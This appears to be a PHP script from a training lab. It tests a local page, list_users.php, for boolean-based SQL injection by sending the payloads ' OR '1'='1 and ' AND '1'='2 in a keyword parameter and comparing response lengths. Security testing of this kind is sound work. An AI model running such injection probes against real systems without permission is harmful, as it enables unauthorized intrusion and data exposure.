<?php
function fetch($url) {
    $opts = ['http' => ['method' => 'GET', 'timeout' => 15]];
    return file_get_contents($url, false, stream_context_create($opts));
}

$base = 'http://localhost/11-training-php/list_users.php';

$normal = fetch($base);
$true = fetch($base . '?keyword=' . urlencode("' OR '1'='1"));
$false = fetch($base . '?keyword=' . urlencode("' AND '1'='2"));

echo "normal len: " . strlen($normal) . PHP_EOL;
echo "true   len: " . strlen($true) . PHP_EOL;
echo "false  len: " . strlen($false) . PHP_EOL;

echo PHP_EOL;
if (strlen($true) > strlen($false) * 2) {
    echo "Likely vulnerable to boolean-based SQLi (true response much larger than false)." . PHP_EOL;
} else {
    echo "Boolean test inconclusive (responses similar)." . PHP_EOL;
}
?>